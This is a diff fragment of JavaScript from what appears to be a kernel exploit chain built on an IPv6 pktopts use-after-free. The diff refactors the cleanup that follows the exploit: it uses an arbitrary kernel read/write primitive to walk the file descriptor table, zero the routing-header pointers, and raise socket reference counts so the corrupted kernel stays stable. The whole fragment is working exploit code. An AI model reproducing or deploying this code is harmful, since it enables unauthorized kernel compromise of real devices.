@@ -1486,52 +1486,44 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
    var SO_PCB        = 0x18;
   var  INPCB_PKTOPTS = 0x118;
  
-function addInt(ptrInt, offset) {
-  const low = (ptrInt.lo + offset) >>> 0;
-  const carry = (ptrInt.lo + offset) > 0xffffffff ? 1 : 0;
-  return new Int(low, (ptrInt.hi + carry) >>> 0);
+ function readPtr(base, offset) {
+  return kmem.readp(base.add(offset));
 }
-function get_fd_data_addr(fd) {
 
-  const slot = addInt(ofiles, fd * SIZEOF_OFILES);
-
-  kmem.set_addr(slot);
-  const filep = kmem.readp_at(0);
-
-  kmem.set_addr(filep);
-  return kmem.readp_at(0);
+    function getFdSocket(fd) {
+  
+  const base = kmem.readp(ofiles);              // Addr ofiles (base pointer)
+  const slot = base.add(fd * SIZEOF_OFILES);    // &ofiles[fd]
+  const filep = readPtr(slot, 0);               // struct file*
+  return readPtr(filep, 0);                     // struct socket*
 }
-function get_sock_pktopts(fd) {
-  const sock = get_fd_data_addr(fd);
-  // leggi so_pcb
-  kmem.set_addr(sock);
-  const pcb = kmem.readp_at(SO_PCB);
-  // leggi in6p_outputopts
-  kmem.set_addr(pcb);
-  return kmem.readp_at(INPCB_PKTOPTS);
+
+
+
+    function getSockPktopts(fd) {
+  const sock = getFdSocket(fd);                     // Addr socket*
+  const pcb  = readPtr(sock, SO_PCB);               // Addr inpcb*
+  return readPtr(pcb, INPCB_PKTOPTS);               // Addr ip6_pktopts*
 }
 
     
  try{
 
-for (let sd of pktopts_sds.concat([reclaim_sd, dirty_sd])) {
-  const pkto = get_sock_pktopts(sd);             // Int ptr to pktopts
-  const rptr = addInt(pkto, off_ip6po_rthdr);     // offset to rthdr
-  kmem.write64(rptr, 0);                          // azzera IPv6 rthdr
+ for (let sd of pktopts_sds.concat([reclaim_sd, dirty_sd])) {
+  const pkto = getSockPktopts(sd);
+  kmem.write64(pkto.add(off_ip6po_rthdr), 0);
 }
 
-
-const sock_increase_ref = [
+     const refs = [
   ipv6_kernel_rw.data.master_sock,
   ipv6_kernel_rw.data.victim_sock,
   main_sd,
   worker_sd,
   reclaim_sd,
 ];
-
-for (let sd of sock_increase_ref) {
-  const sockAddr = get_fd_data_addr(sd);         // Int ptr to socket*
-  kmem.write32(sockAddr, 0x100);                  // incrementa so_count
+for (let sd of refs) {
+  const sockAddr = getFdSocket(sd);
+  kmem.write32(sockAddr, 0x100);
 }
      
     log("full restore of pktopts and sock refcounts complete");
